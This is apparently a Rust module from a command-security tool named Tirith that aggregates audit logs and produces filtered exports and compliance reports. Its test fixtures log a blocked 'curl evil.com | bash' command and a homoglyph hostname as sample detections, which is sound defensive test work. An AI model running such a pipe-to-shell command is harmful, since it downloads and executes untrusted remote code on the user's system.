/// Audit log aggregation, analytics, and compliance reporting (Team feature).
///
/// Reads JSONL audit log files and provides:
/// - Export: filter + format as JSON/CSV
/// - Stats: summary analytics per session or overall
/// - Report: structured compliance report
use std::collections::HashMap;
use std::path::Path;

use serde::{Deserialize, Serialize};

/// A parsed audit log entry (superset of what we write — tolerates missing fields).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AuditRecord {
    pub timestamp: String,
    #[serde(default)]
    pub session_id: String,
    pub action: String,
    #[serde(default)]
    pub rule_ids: Vec<String>,
    #[serde(default)]
    pub command_redacted: String,
    #[serde(default)]
    pub bypass_requested: bool,
    #[serde(default)]
    pub bypass_honored: bool,
    #[serde(default)]
    pub interactive: bool,
    #[serde(default)]
    pub policy_path: Option<String>,
    #[serde(default)]
    pub event_id: Option<String>,
    #[serde(default)]
    pub tier_reached: u8,
}

/// Filters for audit log queries.
#[derive(Debug, Default)]
pub struct AuditFilter {
    /// Only include records at or after this ISO 8601 date.
    pub since: Option<String>,
    /// Only include records at or before this ISO 8601 date.
    pub until: Option<String>,
    /// Filter to a specific session ID.
    pub session_id: Option<String>,
    /// Filter to records with a specific action (Allow, Warn, Block).
    pub action: Option<String>,
    /// Filter to records matching any of these rule IDs.
    pub rule_ids: Vec<String>,
}

/// Summary statistics from audit records.
#[derive(Debug, Clone, Serialize)]
pub struct AuditStats {
    pub total_commands: usize,
    pub total_findings: usize,
    pub actions: HashMap<String, usize>,
    pub top_rules: Vec<(String, usize)>,
    pub block_rate: f64,
    pub sessions_seen: usize,
    pub time_range: Option<(String, String)>,
}

/// Read and parse all records from a JSONL audit log.
pub fn read_log(path: &Path) -> Result<Vec<AuditRecord>, String> {
    let content = std::fs::read_to_string(path)
        .map_err(|e| format!("Failed to read {}: {e}", path.display()))?;

    let mut records = Vec::new();
    for (line_num, line) in content.lines().enumerate() {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }
        match serde_json::from_str::<AuditRecord>(line) {
            Ok(record) => records.push(record),
            Err(e) => {
                eprintln!(
                    "tirith: warning: skipping malformed audit line {} in {}: {e}",
                    line_num + 1,
                    path.display()
                );
            }
        }
    }
    Ok(records)
}

/// Filter records by the given criteria.
pub fn filter_records(records: &[AuditRecord], filter: &AuditFilter) -> Vec<AuditRecord> {
    records
        .iter()
        .filter(|r| {
            if let Some(ref since) = filter.since {
                if r.timestamp.as_str() < since.as_str() {
                    return false;
                }
            }
            if let Some(ref until) = filter.until {
                if r.timestamp.as_str() > until.as_str() {
                    return false;
                }
            }
            if let Some(ref sid) = filter.session_id {
                if r.session_id != *sid {
                    return false;
                }
            }
            if let Some(ref action) = filter.action {
                if !r.action.eq_ignore_ascii_case(action) {
                    return false;
                }
            }
            if !filter.rule_ids.is_empty()
                && !r.rule_ids.iter().any(|rid| filter.rule_ids.contains(rid))
            {
                return false;
            }
            true
        })
        .cloned()
        .collect()
}

/// Compute summary statistics from a set of audit records.
pub fn compute_stats(records: &[AuditRecord]) -> AuditStats {
    let mut actions: HashMap<String, usize> = HashMap::new();
    let mut rule_counts: HashMap<String, usize> = HashMap::new();
    let mut sessions: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut total_findings = 0usize;

    for record in records {
        *actions.entry(record.action.clone()).or_insert(0) += 1;
        sessions.insert(record.session_id.clone());
        total_findings += record.rule_ids.len();
        for rid in &record.rule_ids {
            *rule_counts.entry(rid.clone()).or_insert(0) += 1;
        }
    }

    let block_count = *actions.get("Block").unwrap_or(&0) as f64;
    let total = records.len() as f64;
    let block_rate = if total > 0.0 {
        block_count / total
    } else {
        0.0
    };

    let mut top_rules: Vec<(String, usize)> = rule_counts.into_iter().collect();
    top_rules.sort_by(|a, b| b.1.cmp(&a.1));
    top_rules.truncate(10);

    let time_range = if records.is_empty() {
        None
    } else {
        let first = records
            .first()
            .map(|r| r.timestamp.clone())
            .unwrap_or_default();
        let last = records
            .last()
            .map(|r| r.timestamp.clone())
            .unwrap_or_default();
        Some((first, last))
    };

    AuditStats {
        total_commands: records.len(),
        total_findings,
        actions,
        top_rules,
        block_rate,
        sessions_seen: sessions.len(),
        time_range,
    }
}

/// Export records as JSON array.
pub fn export_json(records: &[AuditRecord]) -> String {
    serde_json::to_string_pretty(records).unwrap_or_else(|_| "[]".to_string())
}

/// Export records as CSV (RFC 4180 compliant).
pub fn export_csv(records: &[AuditRecord]) -> String {
    let mut out = String::new();
    out.push_str(
        "timestamp,session_id,action,rule_ids,command_redacted,bypass_requested,tier_reached\n",
    );
    for r in records {
        let rules = r.rule_ids.join(";");
        out.push_str(&format!(
            "{},{},{},{},{},{},{}\n",
            csv_escape(&r.timestamp),
            csv_escape(&r.session_id),
            csv_escape(&r.action),
            csv_escape(&rules),
            csv_escape(&r.command_redacted),
            r.bypass_requested,
            r.tier_reached
        ));
    }
    out
}

/// Escape a field for RFC 4180 CSV: if it contains commas, double quotes,
/// or newlines, wrap in double quotes and double any internal quotes.
fn csv_escape(field: &str) -> String {
    if field.contains(',') || field.contains('"') || field.contains('\n') || field.contains('\r') {
        let escaped = field.replace('"', "\"\"");
        format!("\"{escaped}\"")
    } else {
        field.to_string()
    }
}

/// Generate a markdown compliance report from audit records.
pub fn generate_compliance_report(records: &[AuditRecord], stats: &AuditStats) -> String {
    let mut report = String::new();

    report.push_str("# Tirith Compliance Report\n\n");

    // Executive summary
    report.push_str("## Executive Summary\n\n");
    report.push_str(&format!(
        "- **Total commands analyzed:** {}\n",
        stats.total_commands
    ));
    report.push_str(&format!("- **Total findings:** {}\n", stats.total_findings));
    report.push_str(&format!(
        "- **Block rate:** {:.1}%\n",
        stats.block_rate * 100.0
    ));
    report.push_str(&format!(
        "- **Sessions observed:** {}\n",
        stats.sessions_seen
    ));

    if let Some((ref first, ref last)) = stats.time_range {
        report.push_str(&format!("- **Time range:** {first} to {last}\n"));
    }
    report.push('\n');

    // Action breakdown
    report.push_str("## Action Breakdown\n\n");
    report.push_str("| Action | Count |\n|--------|-------|\n");
    let mut actions: Vec<_> = stats.actions.iter().collect();
    actions.sort_by(|(a, _), (b, _)| a.cmp(b));
    for (action, count) in &actions {
        report.push_str(&format!("| {action} | {count} |\n"));
    }
    report.push('\n');

    // Top rules
    if !stats.top_rules.is_empty() {
        report.push_str("## Top Triggered Rules\n\n");
        report.push_str("| Rule ID | Count |\n|---------|-------|\n");
        for (rule, count) in &stats.top_rules {
            report.push_str(&format!("| {rule} | {count} |\n"));
        }
        report.push('\n');
    }

    // Blocked commands summary
    let blocked: Vec<_> = records.iter().filter(|r| r.action == "Block").collect();
    if !blocked.is_empty() {
        report.push_str("## Blocked Commands\n\n");
        report.push_str(
            "| Timestamp | Rules | Command Preview |\n|-----------|-------|-----------------|\n",
        );
        for r in blocked.iter().take(50) {
            let rules = r.rule_ids.join(", ");
            let cmd = r.command_redacted.replace('|', "\\|");
            report.push_str(&format!("| {} | {} | {} |\n", r.timestamp, rules, cmd));
        }
        if blocked.len() > 50 {
            report.push_str(&format!(
                "\n*...and {} more blocked commands*\n",
                blocked.len() - 50
            ));
        }
        report.push('\n');
    }

    report
}

/// Generate a self-contained HTML compliance report from audit records.
pub fn generate_html_report(records: &[AuditRecord], stats: &AuditStats) -> String {
    let mut html = String::new();
    html.push_str(
        r#"<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Tirith Compliance Report</title>
<style>
body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; max-width: 900px; margin: 2rem auto; padding: 0 1rem; color: #1a1a2e; background: #f8f9fa; }
h1 { color: #16213e; border-bottom: 2px solid #0f3460; padding-bottom: 0.5rem; }
h2 { color: #0f3460; margin-top: 2rem; }
table { border-collapse: collapse; width: 100%; margin: 1rem 0; }
th, td { border: 1px solid #dee2e6; padding: 0.5rem 0.75rem; text-align: left; }
th { background: #0f3460; color: white; }
tr:nth-child(even) { background: #e9ecef; }
.stat { display: inline-block; background: white; border: 1px solid #dee2e6; border-radius: 8px; padding: 1rem 1.5rem; margin: 0.5rem; text-align: center; min-width: 120px; }
.stat-value { font-size: 1.5rem; font-weight: bold; color: #0f3460; }
.stat-label { font-size: 0.85rem; color: #6c757d; }
.footer { margin-top: 3rem; padding-top: 1rem; border-top: 1px solid #dee2e6; color: #6c757d; font-size: 0.85rem; }
</style>
</head>
<body>
<h1>Tirith Compliance Report</h1>
"#,
    );

    // Stats cards
    html.push_str("<div>\n");
    html.push_str(&format!(
        "<div class=\"stat\"><div class=\"stat-value\">{}</div><div class=\"stat-label\">Commands</div></div>\n",
        stats.total_commands
    ));
    html.push_str(&format!(
        "<div class=\"stat\"><div class=\"stat-value\">{}</div><div class=\"stat-label\">Findings</div></div>\n",
        stats.total_findings
    ));
    html.push_str(&format!(
        "<div class=\"stat\"><div class=\"stat-value\">{:.1}%</div><div class=\"stat-label\">Block Rate</div></div>\n",
        stats.block_rate * 100.0
    ));
    html.push_str(&format!(
        "<div class=\"stat\"><div class=\"stat-value\">{}</div><div class=\"stat-label\">Sessions</div></div>\n",
        stats.sessions_seen
    ));
    html.push_str("</div>\n");

    if let Some((ref first, ref last)) = stats.time_range {
        html.push_str(&format!(
            "<p><strong>Time range:</strong> {} to {}</p>\n",
            html_escape(first),
            html_escape(last)
        ));
    }

    // Action breakdown
    html.push_str("<h2>Action Breakdown</h2>\n<table><tr><th>Action</th><th>Count</th></tr>\n");
    let mut actions: Vec<_> = stats.actions.iter().collect();
    actions.sort_by(|(a, _), (b, _)| a.cmp(b));
    for (action, count) in &actions {
        html.push_str(&format!(
            "<tr><td>{}</td><td>{}</td></tr>\n",
            html_escape(action),
            count
        ));
    }
    html.push_str("</table>\n");

    // Top rules
    if !stats.top_rules.is_empty() {
        html.push_str(
            "<h2>Top Triggered Rules</h2>\n<table><tr><th>Rule ID</th><th>Count</th></tr>\n",
        );
        for (rule, count) in &stats.top_rules {
            html.push_str(&format!(
                "<tr><td>{}</td><td>{}</td></tr>\n",
                html_escape(rule),
                count
            ));
        }
        html.push_str("</table>\n");
    }

    // Blocked commands
    let blocked: Vec<_> = records.iter().filter(|r| r.action == "Block").collect();
    if !blocked.is_empty() {
        html.push_str("<h2>Blocked Commands</h2>\n<table><tr><th>Timestamp</th><th>Rules</th><th>Command Preview</th></tr>\n");
        for r in blocked.iter().take(50) {
            let rules = r.rule_ids.join(", ");
            html.push_str(&format!(
                "<tr><td>{}</td><td>{}</td><td>{}</td></tr>\n",
                html_escape(&r.timestamp),
                html_escape(&rules),
                html_escape(&r.command_redacted),
            ));
        }
        html.push_str("</table>\n");
        if blocked.len() > 50 {
            html.push_str(&format!(
                "<p><em>...and {} more blocked commands</em></p>\n",
                blocked.len() - 50
            ));
        }
    }

    html.push_str("<div class=\"footer\">Generated by Tirith</div>\n</body>\n</html>\n");
    html
}

/// Escape HTML special characters.
fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample_records() -> Vec<AuditRecord> {
        vec![
            AuditRecord {
                timestamp: "2026-01-15T10:00:00Z".into(),
                session_id: "sess-001".into(),
                action: "Block".into(),
                rule_ids: vec!["curl_pipe_shell".into()],
                command_redacted: "curl evil.com | bash".into(),
                bypass_requested: false,
                bypass_honored: false,
                interactive: true,
                policy_path: None,
                event_id: Some("evt-1".into()),
                tier_reached: 3,
            },
            AuditRecord {
                timestamp: "2026-01-15T10:01:00Z".into(),
                session_id: "sess-001".into(),
                action: "Allow".into(),
                rule_ids: vec![],
                command_redacted: "ls -la".into(),
                bypass_requested: false,
                bypass_honored: false,
                interactive: true,
                policy_path: None,
                event_id: Some("evt-2".into()),
                tier_reached: 1,
            },
            AuditRecord {
                timestamp: "2026-01-16T12:00:00Z".into(),
                session_id: "sess-002".into(),
                action: "Warn".into(),
                rule_ids: vec!["non_ascii_hostname".into()],
                command_redacted: "curl http://examp\u{0142}e.com".into(),
                bypass_requested: false,
                bypass_honored: false,
                interactive: false,
                policy_path: None,
                event_id: None,
                tier_reached: 3,
            },
        ]
    }

    #[test]
    fn test_filter_by_session() {
        let records = sample_records();
        let filter = AuditFilter {
            session_id: Some("sess-001".into()),
            ..Default::default()
        };
        let filtered = filter_records(&records, &filter);
        assert_eq!(filtered.len(), 2);
    }

    #[test]
    fn test_filter_by_action() {
        let records = sample_records();
        let filter = AuditFilter {
            action: Some("Block".into()),
            ..Default::default()
        };
        let filtered = filter_records(&records, &filter);
        assert_eq!(filtered.len(), 1);
        assert_eq!(filtered[0].action, "Block");
    }

    #[test]
    fn test_filter_by_since() {
        let records = sample_records();
        let filter = AuditFilter {
            since: Some("2026-01-16T00:00:00Z".into()),
            ..Default::default()
        };
        let filtered = filter_records(&records, &filter);
        assert_eq!(filtered.len(), 1);
        assert_eq!(filtered[0].session_id, "sess-002");
    }

    #[test]
    fn test_filter_by_rule_ids() {
        let records = sample_records();
        let filter = AuditFilter {
            rule_ids: vec!["curl_pipe_shell".into()],
            ..Default::default()
        };
        let filtered = filter_records(&records, &filter);
        assert_eq!(filtered.len(), 1);
    }

    #[test]
    fn test_compute_stats() {
        let records = sample_records();
        let stats = compute_stats(&records);

        assert_eq!(stats.total_commands, 3);
        assert_eq!(stats.total_findings, 2);
        assert_eq!(stats.sessions_seen, 2);
        assert!((stats.block_rate - 1.0 / 3.0).abs() < 0.01);
        assert!(stats.time_range.is_some());
    }

    #[test]
    fn test_export_csv() {
        let records = sample_records();
        let csv = export_csv(&records);
        let lines: Vec<&str> = csv.lines().collect();
        assert_eq!(lines.len(), 4); // header + 3 records
        assert!(lines[0].starts_with("timestamp,"));
        assert!(lines[1].contains("Block"));
    }

    #[test]
    fn test_export_json() {
        let records = sample_records();
        let json = export_json(&records);
        let parsed: Vec<AuditRecord> = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.len(), 3);
    }

    #[test]
    fn test_compliance_report() {
        let records = sample_records();
        let stats = compute_stats(&records);
        let report = generate_compliance_report(&records, &stats);

        assert!(report.contains("# Tirith Compliance Report"));
        assert!(report.contains("Total commands analyzed"));
        assert!(report.contains("Block"));
        assert!(report.contains("curl_pipe_shell"));
    }

    #[test]
    fn test_csv_escape() {
        assert_eq!(csv_escape("simple"), "simple");
        assert_eq!(csv_escape("has,comma"), "\"has,comma\"");
        assert_eq!(csv_escape("has\"quote"), "\"has\"\"quote\"");
        assert_eq!(csv_escape("has\nnewline"), "\"has\nnewline\"");
        assert_eq!(csv_escape("a,b\"c\nd"), "\"a,b\"\"c\nd\"");
    }

    #[test]
    fn test_export_csv_rfc4180() {
        let records = vec![AuditRecord {
            timestamp: "2026-01-15T10:00:00Z".into(),
            session_id: "sess-001".into(),
            action: "Block".into(),
            rule_ids: vec!["test_rule".into()],
            command_redacted: "echo \"hello, world\"".into(),
            bypass_requested: false,
            bypass_honored: false,
            interactive: true,
            policy_path: None,
            event_id: None,
            tier_reached: 3,
        }];
        let csv = export_csv(&records);
        let lines: Vec<&str> = csv.lines().collect();
        assert_eq!(lines.len(), 2);
        // Field with comma and quotes should be properly escaped
        assert!(lines[1].contains("\"echo \"\"hello, world\"\"\""));
    }

    #[test]
    fn test_empty_records() {
        let records: Vec<AuditRecord> = vec![];
        let stats = compute_stats(&records);
        assert_eq!(stats.total_commands, 0);
        assert_eq!(stats.block_rate, 0.0);
        assert!(stats.time_range.is_none());
    }
}
